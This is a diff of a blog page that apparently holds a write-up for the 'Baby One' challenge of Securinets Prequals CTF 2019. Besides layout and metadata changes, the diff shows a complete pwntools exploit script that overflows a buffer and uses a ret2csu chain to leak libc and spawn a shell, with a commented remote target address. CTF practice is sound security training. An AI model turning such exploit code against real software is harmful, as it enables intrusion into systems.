@@ -12,19 +12,19 @@
     
         <meta name="keywords" content="WriteUps,Securinets">
     
-    <meta name="description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   Baby One Binary File  [Problem]  12345678910111213141516171819">
+    <meta name="description" content="Baby One Binary File  [Problem]  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051r = process(&apos;./baby1&apos;)#r = remote(&apos;51.254.114.246&apos;, 1111)e = ELF(&apos;./baby1">
 <meta name="keywords" content="WriteUps,Securinets">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Securinets Prequals CTF 2019 Baby One">
 <meta property="og:url" content="http://j0n9hyun.github.io/2019/03/25/securinet_baby1/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   Baby One Binary File  [Problem]  12345678910111213141516171819">
+<meta property="og:description" content="Baby One Binary File  [Problem]  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051r = process(&apos;./baby1&apos;)#r = remote(&apos;51.254.114.246&apos;, 1111)e = ELF(&apos;./baby1">
 <meta property="og:locale" content="ko">
 <meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58142220-3139ae80-7c81-11e9-8c61-51c92a4bdc41.PNG">
-<meta property="og:updated_time" content="2019-05-22T02:03:33.614Z">
+<meta property="og:updated_time" content="2019-05-22T06:05:17.649Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Securinets Prequals CTF 2019 Baby One">
-<meta name="twitter:description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   Baby One Binary File  [Problem]  12345678910111213141516171819">
+<meta name="twitter:description" content="Baby One Binary File  [Problem]  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051r = process(&apos;./baby1&apos;)#r = remote(&apos;51.254.114.246&apos;, 1111)e = ELF(&apos;./baby1">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58142220-3139ae80-7c81-11e9-8c61-51c92a4bdc41.PNG">
     
 	<link rel="canonical" href="http://j0n9hyun.github.io/2019/03/25/securinet_baby1/">
@@ -178,18 +178,18 @@
         
         
         <div class="article-entry" itemprop="articleBody">
-            <style>
-  img.border-shadow{
-    border:1px solid #888888;
-    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
-}
-</style>
-<h2 id="baby-one"><a class="markdownIt-Anchor" href="#baby-one"></a> Baby One</h2>
+            <h2 id="baby-one"><a class="markdownIt-Anchor" href="#baby-one"></a> Baby One</h2>
 <p><a href="/j0n9hyun.github.io/upload/baby1">Binary File</a></p>
 <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142220-3139ae80-7c81-11e9-8c61-51c92a4bdc41.PNG">
 <center><small>[Problem]</small></center> <br>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">r = process(<span class="string">'./baby1'</span>)</span><br><span class="line"><span class="comment">#r = remote('51.254.114.246', 1111)</span></span><br><span class="line">e = ELF(<span class="string">'./baby1'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x4006c3</span></span><br><span class="line">csu_init1 = <span class="number">0x4006B6</span></span><br><span class="line">csu_init2 = <span class="number">0x4006A0</span></span><br><span class="line">main_addr = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">write_got = e.got[<span class="string">'write'</span>]</span><br><span class="line">write_os = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_got = e.got[<span class="string">'read'</span>]</span><br><span class="line">system_os = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_os = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">libc_start = e.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(csu_init1)</span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(write_got)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(write_got)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(csu_init2)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leaked - write_os</span><br><span class="line">system_addr = libc_base + system_os</span><br><span class="line">binsh_addr = libc_base + binsh_os</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">r.sendlineafter(<span class="string">"\n"</span>, payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <center><small>[Exploit Code]</small></center><br>
+<style>
+  img.border-shadow{
+      border:1px solid #888888;
+      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+  }
+</style>
 
         </div>
         <footer class="article-footer">
@@ -275,18 +275,12 @@
         "dateCreated": "2019-03-25",
         "dateModified": "2019-05-22",
         "url": "http://j0n9hyun.github.io/2019/03/25/securinet_baby1/",
-        "description": "
-  img.border-shadow{
-    border:1px solid #888888;
-    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
-}
-
- Baby One
+        "description": " Baby One
 Binary File
 
 [Problem] 
-12345678910111213141516171819"
-        "wordCount": 277
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051r = process('./baby1')#r = remote('51.254.114.246', 1111)e = ELF('./baby1"
+        "wordCount": 283
     }
 </script>
 
